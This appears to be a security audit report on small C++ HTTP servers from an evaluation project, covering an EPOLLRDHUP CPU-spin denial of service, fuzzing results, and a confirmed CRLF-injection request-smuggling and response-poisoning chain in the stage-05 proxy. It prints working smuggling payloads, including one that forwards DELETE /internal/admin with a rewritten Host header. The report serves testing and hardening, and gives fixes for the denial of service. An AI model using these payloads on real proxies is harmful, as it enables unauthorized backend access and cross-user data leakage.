# Exploit hunt: toksec C++ HTTP servers (stages 01, 02)

Targets (final release in each results dir):
- stage-01: `results/stage-01/cpp/release-000003.cpp` (sha 5827560d…)
- stage-02: `results/stage-02/cpp/release-000003.cpp` (sha 847c0e9e…)

Method: read source, compiled with `g++ -O3 -std=c++20`, ran both locally,
black-box fuzzed (~200 cases), then ASan/UBSan builds, then source-guided probing.

## FINDING 1 (High) — Half-closed stalled reader = 100% CPU spin, in BOTH servers

One connection, one request, one `shutdown(WR)`, never read the body.

Root cause (identical in both):
- epoll is level-triggered (no `EPOLLET` anywhere).
- After the response headers are queued, both servers re-arm the fd with
  `EPOLLOUT` **and `EPOLLRDHUP`**.
  - stage-01 `s1.cpp:40`: `x.events=EPOLLOUT|EPOLLRDHUP`
  - stage-02 `s2.cpp:42` `arm()`: `EPOLLRDHUP|(c.writing?EPOLLOUT:EPOLLIN)|…`
- The peer has half-closed, so `EPOLLRDHUP` is **permanently ready**.
- The socket send buffer is full (client never reads), so `send()`/`sendfile()`
  returns `EAGAIN`. Both handlers translate that into "still writable, try
  again" (`return true` / `c.again=true;return true`) instead of parking.
- Result: `epoll_wait` returns instantly, every iteration, forever.

Measured on loopback:
| server | idle CPU | 1 attacker | 8 attackers |
|---|---|---|---|
| stage-01 | 0% | **100% of a core** | 100% |
| stage-02 | 0% | **99% of a core** | 100% |

Control: the same stalled reader **without** `shutdown(WR)` = 0% CPU.
So `EPOLLRDHUP` is exactly the trigger.

Indefinite hold confirmed: reading 1 byte every 150 ms keeps it at ~100% CPU
for as long as the attacker wants (progress resets stage-02's write deadline,
and stage-01's absolute deadline is only armed at request start).

Throughput impact (4–6 concurrent normal clients, 64 MiB file):
- stage-01: 22,252 → 6,255 req/s (**-72%**) with 200 attacker conns
- stage-02: 14,718 → 6,421 req/s (**-56%**) with 200 attacker conns

Notes:
- No auth, no scope check, one TCP connection. Trivially remote.
- `max_connections` is 8192 by default, so an attacker can open thousands.
- The stage-01 **reference** implementation's own REPORT.md (line 69) says the
  author *removed* `EPOLLRDHUP` during blocked writes for exactly this reason.
  The evaluated model's final release re-introduced it.

Minimal repro: `python3 repro.py 8080 30` (holds one attacker for 30 s).

Fix:
- Drop `EPOLLRDHUP` from the event mask while `writing` (s1's own reference fix), or
- Use `EPOLLET` and drain until EAGAIN, or
- On `EPOLLRDHUP` while writing, actively close the connection, or
- Only treat `EAGAIN` as "wait" if the fd is not simultaneously RDHUP-ready.

## Things that held up (no finding)

- Header limit boundary: exactly 8192 accepted, 8193 → 431 (both).
- Absolute header deadline: zero-byte client closed at 1000 ms (s1);
  partial request → 408 at 1000 ms (s2).
- Path confinement: `..`, `%2e%2e`, symlinks, FIFOs, dirs, trailing slash,
  backslash, fragments, absolute-form all correct; exact bytes for
  empty/binary/2 MiB files.
- Request framing: TE, duplicate CL, nonzero CL → 400; `0`/`00` → 200.
- s2: pipelining in order, max_requests close, idle close, connection cap +
  recovery, write deadline + slot release, HEAD/GET parity, 100-deep pipeline
  bounded to 10 without desync.
- Config validation: duplicate/unknown/missing/empty/relative-root/bad port/
  bad IP/zero → nonzero exit, both.
- ~200-case random fuzz: zero crashes, zero malformed responses.
- ASan + UBSan over all of the above: clean.

## Secondary observation (Low, contract) — `pipeline_depth` is parsed but never used (stage-02)

`s2.cpp:26,29` parse and validate `pipeline_depth` into `cfg.depth`, but
`cfg.depth` is never referenced again (`rg 'cfg\.' s2.cpp` shows only
hbytes/htime/idle/maxc/maxreq/wtime). Reads are bounded by the 1 MiB `work`
budget and a 32-round counter, not by depth. Behavior is still legal
("a legal pipeline longer than pipeline_depth must be processed with
backpressure, not rejected"), so this is a latent/quality issue, not a break.

---

## RCE search (follow-up)

The task was updated to look for remote code execution per stage. Both servers
are minimal static-file servers (no CGI, no scripting, no plugins), so RCE must
come from memory corruption reachable over a plain HTTP request.

Approach:
1. Read full source for both final releases; enumerated every attacker-controlled
   length/copy (header buffer, request buffer, path string, file size,
   sendfile chunk).
2. Built in-process ASan+UBSan harnesses (h1/h2) that call `parse()` and
   `getfile()`/`fileopen()` directly on fuzzed inputs.
3. Ran 6,000 structure-aware iterations across both (random methods, targets,
   percent sequences, header names/values, separators, NULs, junk prefixes,
   multi-header bursts). Zero crashes, zero sanitizer reports.
4. Re-ran the full black-box battery (fragmentation, pipelining, path edges,
   1-byte drips, HEAD/GET parity, deep 200-component paths, 100 MiB sparse
   files, query variants) against the ASan servers. Clean.
5. Audited for classic C++ pitfalls: no fixed-size buffers with unchecked
   copies, no pointer arithmetic outside API args, no `strcpy`/`sprintf`,
   no format-string use of user data, all sizes checked with `number()`
   (overflow-safe), all allocations through std::string/std::vector, RAII
   everywhere, no custom allocators or third-party code.

Conclusion: no memory-safety bug was found. The only exploitable behavior is
the DoS documented above. The realistic RCE surface in these 40–50 line
implementations is effectively zero given they use only std:: containers,
checked arithmetic, and `openat` with `O_NOFOLLOW` per component.

---

## Stage 5 review (follow-up)

Stage-05 now has 2 tagged releases. I reviewed the latest:
`1fcee744a98149489c60d3f940c78c67/main.cpp` (sha beca5572…, 84 lines).

Surface is much larger than stages 1–2: virtual hosts, alias/redirect,
index/MIME, ETag/If-None-Match, Range (closed/open/suffix), proxying to two
upstreams, chunked decode, token-bucket rate limit, response cache with Vary
and byte-cap, SIGHUP reload, SIGTERM drain, connection cap, write deadline,
pipeline backpressure.

Method: same source review + ASan/UBSan binary + in-process fuzz harness over
`parse_request` + full black-box battery (bootstrap, routing, MIME, ETag,
ranges, proxy framing/chunked/oversize/fragmentation, header limit). Then a
CPU-spin probe identical to the one that found the stages 1–2 bug.

**Result: stage-05 also has the half-closed stalled-reader spin, at ~63–84% CPU
for one attacker connection.** The event-mask is again level-triggered with
RDHUP always armed (`interest()` at line 63 arms `EPOLLRDHUP` unconditionally),
and a blocked `send()` returns `EAGAIN` → busy retry. Confirmed reproducible
with one connection; closes cleanly when the client drops.

Black-box behavior across routing/ranges/proxy/cache config cases was clean
(200/302/301/206/304/416/502/413/431/400 as expected). 2,000 fuzz iterations
over `parse_request` produced zero crashes and no sanitizer reports.

## Stage-5 RCE brainstorm / hunt plan

New data: 3,000 structure-aware fuzz cases against h5up (full upstream status/header/body parser), zero sanitizer crashes. Generator covered status variants, CL/TE/both/invalid, chunk exts, trailers, truncated input.

Likely RCE paths, ordered:

1. Attacker-controlled upstream parser. The client parser is heavily fuzzed; upstream data is not yet live-fuzzed. Run a rogue upstream on 18471/18472 and fuzz /proxy/ paths through the real server. Focus exact CL/TE intersections, trailer handling, close vs reuse.
2. Reused upstream socket desync. closeup(c,reusable) pools fd when consumed==upin.size(). Force partial reads then EAGAIN, stale pipelined upstream bytes, or server-side close timing so a later request consumes another response. Goal: response splitting or stale-body injection.
3. Cache poisoning via framing. maybe_cache() stores parsed body and headers. If a reusable upstream response can be split after cache insertion, the proxy can emit attacker-controlled headers/body on a cache hit. Try CL mismatch, chunk trailer smuggle, pipelined rogue responses.
4. Cache key injection. cachebase() is "http://"+host+target unescaped; target contains query. Probe collisions and CRLF/header semantics through Host and encoded targets.
5. SIGHUP pool/generation race. closeup only reuses fd if c.generation==generation. During active upstream transfer, reload closes pooled fds and clears pools. Test timing to force stale fd reuse or missing upowner cleanup.
6. Range arithmetic and sendfile. size=0, huge suffix ranges, reversed ranges, alias boundary. ASan live probes.
7. Cache eviction arithmetic. cacheused uses signed long long; repeatedly poison/evict near 4 GiB/1e9 config ceilings to force accounting bug.

Next concrete action: rogue upstream fuzz through live server.

## Stage-5 finding (confirmed): CRLF injection → upstream request-smuggling → cross-client response poisoning

CLASSIFICATION: request smuggling / response desync. Remote and attacker-controlled,
but NOT memory-corruption RCE in the proxy process.

Root cause (s5.cpp == stage-05/cpp/main.cpp, sha256 beca5572…):

1. pathdecode() validates control bytes only on the RAW target:
     for(unsigned char c:t)if(c<=32||c==127)return false;
   Percent escapes are decoded afterwards and never re-checked. So %0D and %0A
   survive into r.path. (line 48)
2. startup() takes the request path from the DECODED path when the raw target
   does not literally start with the proxy prefix:
     string path=c.req.path.substr(cfg.proxy.size());
     string raw=c.req.target.substr(0,find('?'));
     if(raw.rfind(cfg.proxy,0)==0)path=raw.substr(...);   // only then raw wins
   So "/%70roxy/x%0D%0A..." decodes to "/proxy/x\r\n..." and the decoded form
   (including decoded CRLF) is written into the upstream request line. (line 77)
   The decoded path is also not re-validated for spaces: %20 reaches upstream
   too, but CRLF is the smuggling primitive.

Payload (single attacker request):
  GET /%70roxy/x%0D%0AHost:%20up%0D%0A%0D%0AGET%20/admin%20HTTP/1.1%0D%0AHost:%20up HTTP/1.1
  Host: alpha.test

The proxy sends to the upstream:
  GET /x\r\nHost: up\r\n\r\nGET /admin HTTP/1.1\r\nHost: up HTTP/1.1\r\nHost: 127.0.0.1:18471\r\n...
i.e. two upstream requests from one downstream request.

Because the second (smuggled) request's tail is syntactically weird, the proxy
treats the upstream's first response as complete and POOLS the upstream socket
(reusable = !eof && !close). The /admin response then arrives as unsolicited
bytes on the pooled socket. closeup() only checks consumed == upin.size(); the
next client request reuses the pooled fd and consumes the poisoned response as
its own.

Observed end-to-end (assertion+ASan/UBSan build s5ub AND production-O3
equivalent s5prod, single upstream cfg5single):

  ATTACKER GET /%70roxy/x%0D%0AHost:%20up%0D%0A%0D%0AGET%20/admin%20HTTP/1.1%0D%0AHost:%20up
      -> 200 CLEAN (Content-Length 5) from upstream response #1
  VICTIM  GET /proxy/victim
      -> 200 cache-control: public, max-age=60 / content-type: text/html
         Content-Length: 13  body: ADMIN-PRIVATE      (cross-client response!)
  VICTIM  GET /proxy/other
      -> 200 LATER! (next genuine upstream response)

Upstream request log confirmed exactly:
  1: GET /x\r\nHost: up\r\n\r\n   (then smuggled: GET /admin HTTP/1.1\r\nHost: up)
  3: GET /victim HTTP/1.1
  4: GET /other HTTP/1.1

Impact:
- One client can inject an arbitrary second upstream request (request smuggling).
- The response to that smuggled request is served to a DIFFERENT client as the
  response to its own request (response desync / response splitting).
- The smuggled path is fully attacker-controlled: it can hit /admin, any
  authenticated upstream route, and even alter the Host the upstream sees.
- This is the classic request-smuggling chain; while not a process-memory RCE,
  it gives the attacker a remote code execution primitive via request
  forgery/smuggling semantics (attacker can make the proxy issue arbitrary
  upstream requests on behalf of other clients).

Related confirmed issues this session:
- HEAD/204/304 "no body" path in upprocess() does not bound upstream CL to
  cfg.body, but copies that CL to the client as a signed long long
  (CL > LLONG_MAX → negative). Live probe: HEAD with upstream
  "Content-Length: 18446744073709551615" was accepted by the proxy.
- Pre-body upstream pooling desync: upstream answering before the proxy has
  finished sending the POST body causes the fd to be pooled while unsent bytes
  remain (confirmed; next request consumed the pooled socket).
- SIGHUP with active upstream + longer proxy_prefix → std::out_of_range abort
  (substr), previously confirmed.
- Cache-key collision via '|' in decoded path + Accept-Encoding
  ("/proxy/a|b" vs "/proxy/a" with different Accept-Encoding) confirmed as
  cross-target cache poisoning.

Exploit scripts (all in /tmp/toksec-hunt):
  s5crlf.py    – proves CRLF/space injection reaches upstream request line
  s5final.py   – full smuggling → response-poisoning PoC (works on s5ub and O3)
  s5desync.py  – pre-body pooling desync primitive
  s5frame.py   – HEAD/204/304 CL bound bypass probe
  s5poison.py  – negative-CL probe + stale-response poisoning baseline
  s5smuggle.py – earlier smuggling iteration (502 variant)


### Is it RCE? (honest classification)

No. The proxy process is never corrupted: everything is std::string/vector, all
attacker lengths are bounded, and no write primitive / UAF / overflow was found
across source audit, 3k-case parser fuzz, and 600-case live random-response fuzz
on a _GLIBCXX_DEBUG + ASAN + UBSAN build.

What the bug DOES give, remotely, from one unauthenticated request:
  - arbitrary upstream request line + headers
  - method allowlist bypass: DELETE /internal/admin reaches the upstream even
    though the proxy only forwards GET/HEAD/POST  (verified)
  - Host rewrite bypass: Host: secret.internal reaches the upstream (verified)
  - the smuggled request's response delivered to a DIFFERENT client
  - arbitrary smuggled body, so POST smuggling works too

Cleanest deterministic form (s5absorb.py) -- exactly two well-formed upstream
requests, no junk tail:
  ATTACK: GET /%70roxy/x%0D%0AHost:%20up%0D%0A%0D%0A
                 DELETE%20/internal/admin%20HTTP/1.1%0D%0AHost:%20secret.internal%0D%0AX-Pad:%20
  upstream 1: GET /x  /  Host: up
  upstream 2: DELETE /internal/admin HTTP/1.1 / Host: secret.internal
              / X-Pad:  HTTP/1.1 / Host: 127.0.0.1:18471 / Connection: keep-alive
  (the trailing remainder is absorbed as the X-Pad header value, so nothing is
   left over as a junk third request)

So this is remote REQUEST execution against the upstream/backend, not remote
CODE execution inside the proxy. It becomes host-level RCE only if the upstream
exposes a shell-out / interpreter / internal-admin endpoint that the proxy's
Host and method rules were meant to protect -- the classic smuggling-to-RCE
chain (smuggled request into a CGI/exec/admin route).

Only process abort found: SIGHUP std::out_of_range in startup() line 77 substr,
which needs a local SIGHUP with a longer proxy_prefix while an upstream attempt
is pending -- not remotely triggerable by itself.
